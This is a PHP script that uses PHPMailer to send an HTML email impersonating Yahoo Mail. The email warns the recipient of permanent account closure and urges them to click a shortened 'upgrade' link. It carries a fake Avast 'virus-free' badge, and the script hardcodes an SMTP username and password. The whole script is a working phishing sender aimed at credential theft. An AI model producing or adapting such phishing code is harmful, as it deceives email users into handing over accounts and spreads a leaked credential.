<?php
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'smtp.mail.yahoo.com';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'dominusinferi@yahoo.com';                     // SMTP username
    $mail->Password   = 'pamhguqraxpmlrvy';                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 465;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
    $mail->setFrom('dominusinferi@yahoo.com', 'Yahoo Mail');
    $mail->addAddress('maxgomery@yahoo.com');               // Name is optional

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'Critical alert _Closure Of Your Account Has Been Processed';
    $mail->Body    = '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Yahoo</title>
        <style>
            body{
                padding: 0;
                margin: 0;
            }
            .container{
                padding: 10px 10px 10px 10px;
            }
            .caption b{
                font-size: 48px;
                color: #652191;
            }
            .caption span{
                font-size: 24px;
                font-weight: bold;
            }
            .greeting b{
                font-family: verdana, helvetica, sans-serif;
                font-size: 16px;
            }
            .info p{
                font-family: verdana, helvetica, sans-serif;
                font-size: 16px;
                color: #000000;
            }
            .info p b a{
                font-family: "bookman old style", "new york", times, serif;
                font-size: 16px;
                color: rgb(25,106,212);
            }
            .info p b{
                font-family: verdana, helvetica, sans-serif;
                font-size: 16px;
            }
            .info i{
                font-family: Arial;
                font-size: 13px;
                color: #000000;
            }
            .info p span{
                font-size: 12pt;
                color: rgb(61, 77, 90);
                font-family: calibri, verdana, arial, helvetica;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="caption">
                <b>Yahoo!</b>
                <span>MAIL</span>
            </div>
            <div class="greeting">
                <b>Dear Yahoo User,</b>
            </div>
            <div class="info">
                <p>
                    Your Mail version is outdated,
                <br>
                    Failure to Upgrade to the newest Yahoo Mail 8.1 now will result to a permanent account closure.
                </p>
                <p>
                    According to provision 18.3 of Terms and Conditions, Yahoo may at anytime terminate its services for accounts.
                </p>
                <p>
                    <b><a href="https://bit.ly/3omptDM" target="_blank">CLICK HERE TO UPGRADE NOW</a></b>
                </p>
                <br>
                <p>
                    Thanks,
                    <br>
                    <b>Yahoo! Mail Team.</b>
                </p>
                <p>
                    Please do not reply to this e-mail. Mail sent to this address cannot be answered.
                    <br>
                    For assistance, log in to your email! website and choose the "Help" link on any page.
                </p>
                <p>
                    <i>
                        Customer Service Email ID # 1007.
                        <br>
                        c 2021!, Inc. All rights reserved
                    </i>
                </p>
                <img width="46" height="29" src="https://ecp.yusercontent.com/mail?url=https%3A%2F%2Fci6.googleusercontent.com%2Fproxy%2FlQEOmcuMXtfXd8A6dIqqPm0uM-5RjDR8z2FK0dHB-iKP1EFGhFES20gLWCVZexNEG3IMm1C38xljXerZ7mYq_hlXIlauz6cATm2TCq1NUovo_UX82uBqt7_B0erUp4MbBlzGHSJ5sIRufyYRk2Hi6WlnhuZRQyxiqdzNuBoLCcrYceZMnUfYP3_EHYJBO8biaycbDHxTuWQrdaNBINg9TCfQm8goApV2oHon72v8SyUGgxhZODllA3JmRvzNzTNk-AmRuwPhuZ0sEmjwrwsGbxWfNnGNfFoKUagTQE_v3TvcyZtjyVGf50tRj_byPUbXbsAEvJmpOo4DxLox2M7c9MeHo64Pw5DydFzsX7htUbThngn9aGx2HgwUgHQerb9SFIW8hMBKDwAb0M7vuPIQHWciJFFIQPLKP923QqwUaejLM-cml7gUSuEjSpKCgCs7QldgZax4kuYrM1Nuw0TX3FZTiyb2Z5g3Tc1oRV3d_NbgATzGTU1JqdRpeF9k-lacuRdHGTTnF8eNtL0xXgH9TTnPqNtUwOFjNJzWPLgji8_LH4-UUd4CrScbbrmvKRFXsaQeHlKOIntwEST3mecgL6MDt7WiaHFFK_lxcp62Tdp0_vzLx9xJRpqxYLsXSPFclwrhxs9XdW7xDxbS-ROkKO0C75TpqhCIhVbwUSfU-JzxezbBJpEv2uj1JCRh9YWLkC7rpY89i4BaVBoqWcaRDkBAO30nX4iFoJzfvOrLahRS4B3y0QtiOGZ_5Z4kxgZqYtEsc2xRkckWqAkKJoQcolU_4jcCLMrY_QJFdCx9wxHKYTbrqJp91eBNxian6bA7UfnwWTUlqWL8Bq3GZdrtJL5SUx4HDvBb34OtRurSA3aw8SMlR_FEmqXlcv-FFHhw8EoUR7SsM5G1O9VSbEAdymnCB3J9PtU1D8xrXcqv0XlAFLCHhA93IWqBG1gDH1OM0Dm33TWW7ibRpJpL-3EPKpiYuTvGU_fXd9hTUqzFnw7gcYnea1x_qh-gvl3rsQhzcISmDS7FCvDqZD8DmrizWwxVvGU1UGlcBiGCXUHIfNOFbtiEMVbEWURfEJNi5H-A7IuPBRg4gndeCzmEdiMo2egWCoX3SgVvjRxNI67jQWpgzqIsz8V7stQ0UQne1zxw9r8KWAeNIE6EvqjNBaqqF6WX1S0uS781qFkrKV274xefCjmO5aHdnwB0ihugzAZNRZ0kHHosTpjOKwj73Af1m3uwua7aYWVrohYc5x6R9Rb3vyuKrLuI1eAv2PAFY2ckLtpxqo0FBn6HY0ADUvLEURMwrNzR_xKYDWoGePxCO090Tdggz0YsOEUwh8gjYeA517--EJrGeqOwyH2LLTQfL7_h2WZllu0rJWTi-UsTstdzC99R6XAEHkmcTzjkBEmimCKhAEcyeYCUSSAL5XU6y3Er3iSZHhmbdWIukcx-jtQ9WtyZyau51uCUnemuJUsKKgJfdostF6KwklxhE6nPg68q-Z-Az6bWCkx9ij1ltdjt8RpmzXb1fRY23E-9y0_qQalWvsccpFl_idO4fpYzl1gTDcyRYkIDMJHDLs2pRHysRPJ1UZV9aB_PnZLSzTUDrAluIL_n_AZlmi-h2gy2lv_h7yKFfOajGt5YYFlO6WFsQ31Q6AQbyrX_P4ORFzd9qUKPmln3mpQ9AB5Oujv2hIYrhWbu0tHRTnOSSBLOY-4x_mA-1NpW0Clr_jxS1GSkHbmyShVnUWxBHhPn1z0tEKNiw9A0HujZzOgXi9E5VxZq9CLT65vdgq9CXARlxfeIMCDR69YtoJTrVOCWsc3RLw3YRB3GI4zE6Phpf_HVX5y0VCr-0ICuhtvF2UlIQzVuEVWIMJYxjxrHS0iwP1crihMusTCL5Xik_BrVcL6qy3FS-tqRvTlShtcJW1DxTtS4TP18SH7NWv5yQda6fG6bhCJp_Zz3fECaABos4qJ0JgdLAaufTbGs0ZGHhWeuvPkj84xQkDKZsBF6p7VxA2dCGx05bRpfpjyhn_Llw2KBgHraO8MAcU2G8-aJHV6nQOsHi8hvetTGDpeXGYfJFMVm2bHoHERj70_TfoeJssBoTTvSwW5TefAXws1SmOxh5PQG3dhENKqYg4s5IkDNEb4RMExSo1AMWJ9lr29k8k3fO8ORKHbUkZvjMc7IxbiS6JHL7kVJ8IFeoYtPXuMZmS1Xe_8FrLgEhdfT8rzOGhnBKDod5bCSL_2f4INTTLvI96PcgcQhbpO_tNUt6P7BBvVn3H9S3V4kg58jut8SGMbDpKmwJsVnswwYrTaDkItFW4s41Odu8Py6a-uJQk-16OL1Hw5hNiKcmHwpeWNnpNXwQhc7WBOAy5-ZpBz-PGqczMc0kgPzUpGbjp3TKcpU_yclic5N4RQA2fpTEq3QhunFopWbi7iJ_sARwMQYGtlJiBvZWApYOqUFs3Z_wYm1pmScAeIl7QgJWPjbPSEiRHvu3EjY3nToFKUMKGVtzVNdiQs3xqhL81241aru0iSMecfp8lf7zOccc2ptu9bncW9te9hiWqjaciAYQMLzhiJoET4-hszQy5YwsVGhutqy4VqDxHo1PwYXfCXWzp1lEguwB9NUJ1VMV9Btxf1dGRXjeOafWHTPJpY21qQWYRkPJTG7niBhYLQ1LIhUhivNYXRJWTY0-XQTGSwyAal4TjRNoorY52D2B7Rtj2E91W8yGFpUV_giFSekDswv0J3txpPGGs0Rd3hbkrTFGZmRg8KMxwTXOVcGvItYZ2RaJ1cXyNQStZqqwLq00blZb1zqhLmvLv1xi6_tl5lVQlFhMalo_dP--h7kA_yWPEeU1GQK87AwGflAIFfluPxqX324I4KVEYR57qqPhtmmIvKhwuN2jD6GIRz81Ms4B0lxnzeEpbixhk1r8tEt9pkIqs4zdsfQ7ljAWo66kfJ9XcwxxqKdU6q90A3mDwOsKsqYU6VpBOL_Ah5R1RBu2GesHr385quRAByz8fPZIZLNdHoPCa2bEQSFLtyWgApjwDq_3upCKL6pFnsRqrKcK2OLs5t8QHrivw6suUbGBQSDcnJCe5_hM29Ie7vrauh3wFA2ar2UVTLzYNrtUEKdDZF_enCntYR3MREaw-6h-Atviqv7dM8Y9W4aV4f3IQcvryZdLiaixnI1anrQBGY8h_IoHr8rZPrdZmjAPHmf32VJHJsTu-p0wl66gu-QMB6ja8jqksZ77WP7zLemgO6t2Tzu7gjJRuxBmkRD2RvYb9BiJBkUVH8eL-_fzJ2M6JZ4riJxPEAo6QI8T8Yw9rUMS43ycNBTO97Ua1W91WZKCm7fPXd19yaQoU0-tp79us3030isoKLSOvDb_EKH_tUHX92bJ-FeRTohdhRE-QkTHEZvtqJ84nQQS7jG3UbmKB3Ay2GrkwV0ZiAtTGe7Nd1_4dJJaAtqR0Roy8C8LltdK8WtzXRrUNRBTrb7jeX4Wenxq8YQBLFguXRBgjW3ppzp6KG_r0uMP3rMDsaAujkL3SeSrTz81_DvgQMcEVcE3c8NckfKk1OA0B1bFHv1bJCJ15wwh7MhRMQTElyOrWpl8f5CBEBpgO6rElH9UMvny1XZr6aaqDlWPQOVg45h2X5zyWPc5VZ5jtiOnl--_CrKVHFaYa85y8SDdNlOqTrtoFnXygMjvYalsTMPfo3_C8bx8thNXIvc4cigNt3cdZUhVHp0iJFbRC3U5giM0P_GzVi3xLzGu4r8JFABV1-FuDVQsQzv8_KG_WlZZH5SWPejFYCIsZEuF0WoXS_GsFlJoCwti1xg8rsxds0yL3J145kF9O_S2C8n_nPrxGzURxc_6DLeK0qWi29WmVSKiyURU_NX80Uk60PoJh6wJ4T7KcJN5foKY_Z2RYCsjDGCfiwk6i6kWiRxMaawjpaimaPWivSXBBpVTX_qQzeM_LKJ0D9wRWfkhw2AFmCNiRejbHaVNmHMkOisKKFjm3oo4CnG_4vgAQJNAEKDir709Jpig-SLZM0sNNKpwacg9WbwCkdnmdXpYByqycKnWpCs_AOBSnNvHEumYh3CbWa8EJINZh1QFuTqXHFrVERaE43Tsuq8TwbU5rRIDeWhaC5MjFvJru6ECWzOwe0FYzeD4K8iL7KkK5KYr_t6l_afqgvvwEhRTTzIiJQps9BMzA5a1aTNDcXZxKUml2tjkVEVA3PxE9DWdSmhi6mZO60iYzQGQRGgAZM914HBVxHXZ4k7OTI1K-WBiUdzH1GtCrNPWj3zPSoRMwyUY3y2eRICs2GEU0okK9V3qNoMkTO9LkVBjWTcd3JIZcr0zMl0rFZL_dp0QeNwLGpsOpjwxxSVJB2Js08Rmyd3Y10PJDMp0iPGIieKovN7Y9MIGhInbtViFJs0ReU4A_W_07Iqo_hiSm_FcTDcvhj2JTLQ9LJ2ynRQFcohlXE671wG5CQ0v8Q-u-eiMesJzxT71higXHLQ4BnIsm7PC-Ia3uOkcQOaLJs7tMDNiA-U53zloZofgL6DmUQqQTL-TendNH5C1O_CojwCMEYwa2l5GvxukVrImDtqfvLiM6E-_0TXrG3eCXa1VAFt2ahikVkN2mylFZsIh2K2U9rlkxS0prxpJLGhZkgQH4hpnDfc3S_0dospjEufxXRnG4EAJMXgiBoWp_WjyjQWr766TTFHvukGdeie1aoeOZ7_TJJLkHpyYqWtsiFhUuLz3rAwO6AJN5EKByt6QEb974hRYR5QRgWu0UZuORThdxWrbhGc9S4Zwp363jzHS3urY-TvO6-eaRK159DODES0RGkB6PrrTf5t4-ObiI0ec1MhVkeAv18oUP7nwPzZusmoK6lGM8bUCXzIqq4yiynT7uAih1amKFOgCT7JLQzGnydOwS4Am7RFDyZTfW_tm6VVZdE48c9rDEUVFy3dj9FvUKCOTho1RYzA_1XK6IKSXspB0qRB-oUmjnUEr-98bCWQ6YgzsyseTvl2PFSOrs4n_JdUOBnrbAr-Ilqi18lXub80M66mOdTvva0XM6HoehbxzjMA63lzbJ_DqVfdXMXWgSYJHcT40Dd4T6RvkFwM9Q1dHvy2cf2VJ2ZnaPs8NwapYm49WpYPqwGcqaRCBX6f1xgnlIUflxmrebwBD76AEdDXqXw2z7A_L6leFNqFNk86FhFYvDySEWQHWz__pOgnloXvXh0-KAtSCXYrHudLU7Oaxb_-PeM5pIlL-XOYADwfiNidBSFkxCvmosnNcvx4jSfZ46oQmhVWe5BspcfvMtDnIWM0KmM-yFEc9-yvMjKla73N9Y7e69BKJIopxOt_HIWT1VoLF2F1DlhjdqKjwszml5X6pbzYi1idSebNVNZXRg9AvUnzOJ14ojwP7NvWJifgb_tv5q7N38L62f7Yd0QvhKyg6ilSoxu4yEimvKIuGYOXw7vRc2zeYxOmwzB35fo4VzC2-4oRaEwOCsLIyxhafO4OtOihzlQXxi42k1X2PGMRVmG6l1H0fXI_RwfOSh356voaN7ZZRlSfFXxockUXAqOCJRRVz7uhEDQh-9rlS1sA7nAx1jzeUaTAj_KSlCL6oJdSfJzAE18UbSRNU2WipKYSWQM0E2rKfy1qDHdvC-5NsQs2JdAe4cnDPQ0b1odsYaRER4kxgmj0W6MA_1Li9-RV_wuE6j3_BWlFKcksFIS5_1IsRXvNk2Yx8HAikn3-NChz6N1s0wWf_BRv3E37NBD-xXpuTkrzoxqbVbq6U28q-CnVttCvUUcUdBAQ73d6XzudJ-AnDPWQFgEsik5mbvW1ODI2TqRJh0zyAJMgdcrH_Ld70223kfV57HhFTVfK6mszkRg5tA5UYNr-y10H1Em8LrAIVAuBQlVoVIRgP-ExwDpSJQ1UOB4Nynn9v3Yg0WZOeM7MmbeDxchUXUeTE7dt9Zxm7qUgMwf9eaYTgsqz0Wj2fXLLqcvLQbb3amA50D7z5h2tlOSWX0vW-EHgWqH29-P5OFO4IcSYCvplQgKbVUrxtc0vj59nw6mFmwteP35DvOK1xhns1PoFG-fFeaZtBeHmg4NwPJoUZclwawjeV2oJb7jrACoyhmpXWAOrILw0xLqbYSOV1TEHtDBXyKuvBu_yLX8kzyiBTY6Z161FNNTcigvdGWuZ0wyxXW9XosHx28TBvwPp2kw00Aj0TNfNpWE8N08rqmPOM4ZE4NNWUUAHSa3o_0OFA0ZNL7dMmMlo7T6kESDMIX0f0myv5A1yLvzIj9RqUjHO0eS_b4Hg-90zjRym4uaWvuyN9SAH1GeDvzrEguIGLwSrfQzMq2-zjNWBHpVPf0mK7QjfG4-sqx3lVSYcECA-vNFOedyAc6gDn0pF1LR_dUGwfinW6lLjhQ33kA1gGw17P7Hl-hc5vQPRA7q5llEiiizracIjhk0jvkTbJ8O8ERjJL4u7Tj5NDeky8KWNmvFzqewlXACGCTJh6V2BVjkfNCQemvvBMWc4WIar2r-qPQFKaTxDo7e_3U-Ch0wMxl9cRxgTC2LP-UxSjILKQvSsgZJQKLMMD3je0lYJ6D4c_E7R4-H-YDjewKpt-1_j5uXb9zv5S8zsgk3ywq8C-4c60uJOC7bxwpij9UucdBOwxIrFFfWu_ChviF2ZM_uRu5iVEO5lTh1YC1zT3jgF1DVUpilsjfpha2c6GJvw9fehni6ooxNvhnclswHQiGM3W2f9GxWmV9znqfIj4Ma72M7lDmii02t64-zmR4ekEVELx2y0B1t-FImYDR3fWlNzF5PwbtheGzcDA9ts4BO-4_zpiT3JyOW3DEIX0hXTSpXwuqrdk8ouT_AqeJTYcF5p7_y0Imdih7PBdkojsNhaWfhwvRZ41aHKmeSkXdYjS5qVi41gS0rwQ_hr0IY0ps5H7NdkN44%3Ds0-d-e1-ft%23https%3A%2F%2Fecp.yusercontent.com%2Fmail%3Furl%3Dhttps%253A%252F%252Fci6.googleusercontent.com%252Fproxy%252FV9svNvHpUhDl4YZV8faVEk5LAxHj5HJy6GrSqkv-96Txrbv1q8jIvP-l5cxep0K0Q_ekF7RXhESflu7_agw3Zz420LiMOkP2_pIiPazj6sSmlt-dTsU6GJZVx-yPefTDQWLEcxfFWwaC8VCy3kuOtNkHe8cgs5dB1DUbBvIf3L9TjedVermZ2dYFqYfalKUWJ-c1tE0U7x4Y6VKjX1L-_ujQXV3gat-WRDmQ_yNddETcziDxi7R2SjTbyg9MeSK61ZYixM_C5MOVmmr9asjVrangy9-Qf433JvuCJ6PEHkkkMpUU1vyRulVEvSnXa7QCVdBxaAVFpFSZ6SZ3XmwdSs_wZNp9xFr-aC_9Hov46rVrPxVO8jOR7NpHr4fLnNX_C67pv03B3XmoBSnfrDrEMtl7xjgtth3kzXAp-iO6S9jC9ufRExHI8IIkmIuX4SA29iQn-3oXdUGD7FNaphaNZY9Tmm5kVyV0aIfcPldmB0VzQQ18b3nUzur2QY3enY-x1emCFEOhXZ97-6JR7tJMjKf2dCsLgMOFc9URMlGqEwYzL_DBg7aQJYhN9mi8HReRclZgaoXEPOufbhsDX7rI50mhvhJMf7I8lUoSSxtruwvJ_OpR8A1_FuCKZD6zoqp2q7pwSAIVWRdLtkTPR_ROne64rCoMDJ_wz3Yybx5UIc0MAFk3ZCbraR66Qa4ZvTTWxklbvYud8dRgkHcGFLheZN2cuwlo4RLI_-Qr3vbp3gWAVoRnJc1kCOxEa6BtFWlSxiQnNNhsKaefprlEu3mOufNaw734yJDS4SlwEeIYA4bpi_Y2X8OwN99nKi_oOBh8VCZIoAiH1DSMAMQWhxKq-RVl-6ihx-YOs2TXb9c6x6r9dU6XuQl0sq9TTDhkqZ67xBewOiFZjTMJ9B4NUGg_AMZbuHulhBxwRvCkTZpMjAHvycyHQb1SrWsMO3A9wFrZdUiLEQoUHM-eJkDPqL-lxFyl0VBSeaTOhefWAk1Bodgrt6NM0h9p45RUVO6VAc8EeOamo8MJ7cj3wjJuz6JsYF6ryGqO5cANPIVkw-EQvyf6pAR14WYl9mXp_MddBGx3x4t5MNGpfQ19sq6TCLErPLEYm_ACH2PeB5NjfYaXc4HfhiuSF8A-SrMQC_S0R474Q1Uk8O42QQ8518wah8hb0DgPPZyyhrFDtnUX9VB42Bu62LdRGjbWfC6HHiTanSHYx_gfw-WgpEq4XMINI2UEvBA0dnmEtUCQ9jtz6gMXny_40SRiDTWpVoQTqcre4IB5OfAJefouBgagV54kgzWDituhtV3ry5TskTkMk7-ThAjw2jGckfQLlQqHGuLE8z46m2JuEFK4f45uDGzC-H2l97HXGQDP-WosMpREy3XP1vtapkSoepnOESUPMOi4Qbj-vlYmzZF79rLiJ_YObupexqfK-l2OdS4amHxi3NMnlsaSfqPjw0xoXE7Kth7LnkOX9MN0xES9Unzf2VQnwA8QdWaeom7PV91CZRh5E-1vyrzOG6yjgMaE985sNMlOJbn8Tjij_hxjZ_bygqntNDxhiRj6qGDdL03yxgO6qc41qK701Ddy6j8b4-KFCZHIY4QERb_IFIsRYLr3VrYQY7KSiRELiQjfINEZEyUiYs5jr5I0dM4S0WLjo8-8HFWJsRwaUU8tQF2tXgcJ-Q-kcBMLI-cK0ukSYPGootgUPNf91kuS8XYC29lQxx0fJ7fD9Lryrl0JDL1YW6I3yipKgNRwtNXQOAQRjmqTjS16X0NE7qxSazjFUDKediAWZYgjFvcwlcW3vgUlw9aN72G4mXzRkSoQzFnTYbNb6YD2nvKJR1q3Z8OgLiA7bsBYvZ-0Fj57PRJE-qaaD8gzIIlLiKmwQ0FutRDZx2mdgc0Qj4gPlhk8iLNAUo4dHvnPSVgjNZjLB0R3w5mc-4IWeQxOL6zrHz3TSoSsoyu256pSQSF73VGzYTs39HDqagulpuZuTtlH5SVekQkNvs1K6KdY8De8-_5tNTOQRZypfDuxVKS91zHpgxjVRrC5bT95rSqG2MV008dsGeBwE1i1yNi9aFJF7qVsX47YIah0StYdUFjda9fxIistLU-i4939LmoCcqHM6VFpKknJf1oiIhXwzZiR3mkWt4JzL9wfQDSnY80gkuZQXYOyIPd6BqEvInE4g-COiEI12kU175lq832eZYvdbgdmezSb40dlv-nDGg47OdM4qbQ-wCzYcn5L8Sb9uM4qjEHmDNM9I3v-JcYzrlAv_mOrQ8DCLkO8nNWLGh5eOeWrFvK6INTzgHzjSC88XHOEPZmtv8KjXAX0NbxZfKwj0w2F4B2g1mk53MPmD4_vKQrTvJ_ENKjihoHzqP9jhZTk3UrAzbmmLvUBMFPl59Oyy8yB-wZonUahFROzBTuj-_Ve5RwwwxtoLaEd-kiUjhoELdisewEcxpQGwRE8738eb3Rgg_hXT8LW27egfd6sV2toXReI-0JNxEJPSX8Mcw2iphaeGhU4nE6nqdyWzCYpZgaWm9DGTffil2qtAUOIm_Xth19YDXKTTK8svIEGfTCpjkVOXq1UyaNXERshqLf6Tghkx72FViy4ns-3ZKZbdeaCfvOfb_J5onR0DDcPJWcCtIT22i_UI2hnGGWR4gU1_KJqtfeqvWLwxRqSdbbuf-5hkfBg5sFuVjC08sslzlT42pxIOs492-0P3Hc7G-pmdVrfezaTzbUrz-uq6PAG50R9IBLGiJAy4ti83yohwiuAnAT-8Uy5ABwb6W0%253Ds0-d-e1-ft%2523https%253A%252F%252Fecp.yusercontent.com%252Fmail%253Furl%253Dhttps%25253A%25252F%25252Fci4.googleusercontent.com%25252Fproxy%25252FtwDkCIdp2hzm1KPzyphgpPgVh56LfrrsyQbJsMTf5QF5VCfBXbKnXiNc-SW0VIq0daY1wXBPvNaTOXeMD1DlA5cxpZRq5yzYCSf5JEcRY0TC3Px4yUvqgo4LECRstJi3dodO9auq-IdWrFmLGnrFLmkEO0f9FE6us9tvUpVl8uHE0AtIKVtGXaN0L0de8wyWodo0ETJHJo7bFsd1Q8qyiFF9sUsNKRCN83McO_jzLCdBBqsLK8BPsFODxjaCkqj4AEnbcPbpJ48t2tNx7nylc_DgfB9W5OwE6-xYCdChsid1qFX50pSyZawx7Vr417Jo5Vd6IPB6vO7awfm_nM3mD8ebD5XwsCsx7ebYfDukVuPhf_MxJ2oWRWPn1VQJcliJYfNjPpy1pjpO9JFbxrNRmBlxoOWUWfK0ZcVhl6LvKq-HRU7MJjBCClDPJrc0lMZJ17HVHswYT9zVJWzpwcUwtGW9_rEpa47lbSzHyRIizOnalClvx5WKJbnFpwzOjc_olPHFynWnPdqBQsQY8sis_qMg6nB4EIbFU8Lg3hSbnsKu9yCoYGhrhNza2zHvxbaB6OeJZHEMvAZMj4O9GVM8QTYK89LW-a2-x8MnOBAX0knrq5ZXp9O6q0Dgkw_MZtGp84dkibWWsmTxfXW0oEtrFW6lM9ykUdDzzz5ckQfEEmakxtu7Ts9AoMFCun2TgaSu0YXDOCkYA8iRjHsvpWy8ZJ04mtseuAhHSsf5Nb1GEB30TMi1Nmj5zQBziAsHh-HHAQyPYnc_-EDe7301yy2qGVud_PTuVn-H-6iD2gZ_U0yGvJzAqtQ9s_XpcmIXe2VKUur6HMuvDhPGWU8bIgRFKY2YMI-sqAzHxOON6snY_LseM0KYRWtfPBQ2m388vzey8A0wAHboY4Wquu0Rj9AeV35xdy8K_nKu3LLkI_Hj1NvZ89bkJt9SnqVfq7dyLLisJ1Y5N15DP-01ieveaPIxuJ0F6osEVrVT0TtI2NZ8SaKx4v4aRE6i8N-C32k1U_Me1V6lCG0%25253Ds0-d-e1-ft%252523https%25253A%25252F%25252Fecp.yusercontent.com%25252Fmail%25253Furl%25253Dhttps%2525253A%2525252F%2525252Fci4.googleusercontent.com%2525252Fproxy%2525252F7drAm-dBDeArwdFsMPZ5A2zBdK1am1-O2-EmJUmXzJyKprqs9V8ThdU_JlEnnpIoT2YltoPdZN1LCIoy1a_GUBcns2SylQz0q8wTENpi7WHgjp3hylluTWvOGp8Ssm3prKGvWPNc6zKK4J5y81Q0pooa2zAbQ6GrMR-Tq-yfiPl90ZZPKAnsqnEM1XGa06EwFnI3_bWl5k0MBBEGDWZpg4swtcD2rSL9ReMF7jcCmyCSDEYtS1PmDN9ZHoM2qvcm5HvyC4_yEinnb8oSUAZQWdFVObdGnH-xuwOVZW9lvjCdDiJiYquQig%2525253Ds0-d-e1-ft%25252523https%2525253A%2525252F%2525252Fecp.yusercontent.com%2525252Fmail%2525253Furl%2525253Dhttps%252525253A%252525252F%252525252Fipmcdn.avast.com%252525252Fimages%252525252Ficons%252525252Ficon-envelope-tick-green-avg-v1.png%25252526t%2525253D1549011713%25252526ymreqid%2525253D04d5be76-b210-e0dd-1ca6-ba026c013100%25252526sig%2525253DjukisbJ53TsU5GkyKUtZNw--%2525257EC%252526t%25253D1550756007%252526ymreqid%25253Da2be33cb-0ad4-72f2-1c0b-8f000e017200%252526sig%25253DQwgvYA292zDtDigJ_wocew--%25257EC%2526t%253D1551185334%2526ymreqid%253D7a9bb2ca-f3d9-a174-1cb5-5a001e015e00%2526sig%253D9_vcruLORTO28dYEcguU4A--%257EC%26t%3D1552463223%26ymreqid%3Decaa7627-3745-2d32-1cf6-7a0002012900%26sig%3DMjAKfpkOmKq9mYCOKKPzeQ--%7EC&t=1611307956&ymreqid=753b20cb-3bb5-1e8e-1c62-910000012100&sig=U1vSZ9dMLkck5lnSxO9c9g--~D" alt="">
                <span>
                    Virus-free
                </span>
                <p>
                    <span>
                        This email has been checked for viruses by Avast antivirus software 100% virus free.
                    </span>
                </p>
                <p>
                    <a href="https://avg/">Safe emailing | Avast</a>
                </p>
            </div>
        </div>
    </body>
    </html>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
